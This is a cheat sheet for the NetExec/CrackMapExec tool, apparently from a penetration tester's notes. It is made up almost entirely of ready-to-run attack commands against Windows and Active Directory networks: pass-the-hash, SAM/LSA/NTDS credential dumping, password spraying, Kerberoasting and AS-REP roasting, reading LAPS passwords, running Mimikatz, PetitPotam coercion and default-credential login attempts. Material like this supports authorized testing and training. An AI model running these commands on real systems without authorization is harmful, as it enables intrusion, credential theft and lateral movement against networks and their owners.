# CrackMapExec / NetExec Reference

**Tags:** #smb #ldap #winrm #enumeration #spray
**Note:** NetExec (nxc) is the maintained fork — use `netexec` or `nxc`

---

## Installation

```bash
sudo apt install netexec
# Alternative from the maintained upstream repository:
pipx install 'git+https://github.com/Pennyw0rth/NetExec.git'
nxc --version
```

---

## SMB

```bash
# Target info
nxc smb $TARGET
nxc smb $SUBNET/24

# Null/guest session
nxc smb $TARGET -u '' -p ''
nxc smb $TARGET -u guest -p ''

# Authenticated enumeration
nxc smb $TARGET -u $USER -p $PASS --users
nxc smb $TARGET -u $USER -p $PASS --groups
nxc smb $TARGET -u $USER -p $PASS --shares
nxc smb $TARGET -u $USER -p $PASS --rid-brute
nxc smb $TARGET -u $USER -p $PASS --pass-pol

# Check admin (shows Pwn3d! if local admin)
nxc smb $TARGET -u $USER -p $PASS

# Spider shares
nxc smb $TARGET -u $USER -p $PASS -M spider_plus
nxc smb $TARGET -u $USER -p $PASS --spider SHARE --regex .

# Execute commands
nxc smb $TARGET -u $USER -p $PASS -x "whoami"
nxc smb $TARGET -u $USER -p $PASS -X "Get-Process"

# Pass-the-Hash
nxc smb $TARGET -u $USER -H NTLMHASH
nxc smb $TARGET -u $USER -H NTLMHASH -x "whoami"
nxc smb $SUBNET/24 -u Administrator -H NTLMHASH --local-auth

# Dump SAM / LSA
nxc smb $TARGET -u $USER -p $PASS --sam
nxc smb $TARGET -u $USER -p $PASS --lsa
nxc smb $TARGET -u $USER -p $PASS --ntds    # DC only

# Password spray
read -rsp 'Approved spray candidate: ' SPRAY_PASS; printf '\n'
nxc smb "$DC_IP" -u users.txt -p "$SPRAY_PASS" --no-bruteforce
nxc smb "$DC_IP" -u users.txt -p "$SPRAY_PASS" --continue-on-success
unset SPRAY_PASS

# Relay list (hosts with signing disabled)
nxc smb $SUBNET/24 --gen-relay-list relay.txt
```

## WinRM

```bash
nxc winrm $TARGET -u $USER -p $PASS
nxc winrm $TARGET -u $USER -H NTLMHASH
nxc winrm $TARGET -u $USER -p $PASS -x "whoami"
```

## LDAP

```bash
nxc ldap $DC_IP -u $USER -p $PASS --users
nxc ldap $DC_IP -u $USER -p $PASS --groups
nxc ldap $DC_IP -u $USER -p $PASS --kerberoasting tgs.txt
nxc ldap $DC_IP -u $USER -p $PASS --asreproast asrep.txt
nxc ldap $DC_IP -u $USER -p $PASS -M laps     # Read LAPS passwords
nxc ldap $DC_IP -u $USER -p $PASS --trusted-for-delegation
nxc ldap $DC_IP -u $USER -p $PASS --password-not-required
```

## MSSQL

```bash
nxc mssql $TARGET -u $USER -p $PASS
nxc mssql $TARGET -u $USER -p $PASS -q "SELECT @@version"
nxc mssql $TARGET -u $USER -p $PASS --local-auth
nxc mssql $TARGET -u sa -p '' --local-auth
```

## SSH

```bash
nxc ssh $TARGET -u $USER -p $PASS -x "id"
nxc ssh $SUBNET/24 -u root -p 'root' -x "id"
```

## RDP

```bash
nxc rdp $TARGET -u $USER -p $PASS
nxc rdp $SUBNET/24 -u $USER -p $PASS
```

## Modules

```bash
# List available modules for protocol
nxc smb -L
nxc ldap -L

# Common modules
nxc smb $TARGET -u $USER -p $PASS -M mimikatz      # Run Mimikatz
nxc smb $TARGET -u $USER -p $PASS -M petitpotam     # Coerce auth
nxc smb $TARGET -u $USER -p $PASS -M zerologon      # Check ZeroLogon
nxc smb $TARGET -u $USER -p $PASS -M printnightmare # Check PrintNightmare
nxc ldap $DC_IP -u $USER -p $PASS -M adcs           # Find ADCS servers
nxc smb $TARGET -u $USER -p $PASS -M gpp_password   # GPP credential files
nxc smb $TARGET -u $USER -p $PASS -M gpp_autologin  # Autologin creds
```

## Output Management

```bash
# Results in ~/.nxc/logs/
cat ~/.nxc/logs/SMB*.log

# Filter successful auths
nxc smb $TARGET -u users.txt -p $PASS 2>/dev/null | grep "+"

# Export to file
nxc smb $SUBNET/24 -u $USER -p $PASS --shares 2>/dev/null | tee smb_shares.txt
```
